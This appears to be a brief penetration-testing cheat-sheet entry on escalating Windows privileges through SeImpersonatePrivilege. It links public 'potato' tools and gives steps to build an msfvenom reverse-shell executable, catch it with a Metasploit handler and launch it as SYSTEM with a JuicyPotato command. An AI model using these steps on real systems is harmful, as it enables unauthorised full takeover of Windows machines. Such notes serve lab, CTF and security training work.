- - -
Great refrence of all **[whomai /priv](https://github.com/gtworek/Priv2Admin)**

✨️ **Exploitable by  [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (needs winrm disabled), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

## Exploiting SeImpersonatePrivilege **:** **( JUICY POTATO )**

- Transfer **Juicypotato.exe** to windows. ( here under **/Temp** Directory ).
- Create a **Reverse-shell** executable with **msfvenom**.
- Start Metasploit **Multi/handler**.
- Transfer **Reverse-shell.exe** to windows. ( here under **/Temp** Directory ).
- Then **run** the following **command on windows**. And Have A **NT-Authority System** Shell.

```cmd
JuicyPotato.exe -l 9090 -t * -p "C:\Temp\Reverse-shell.exe"
```

- - - 

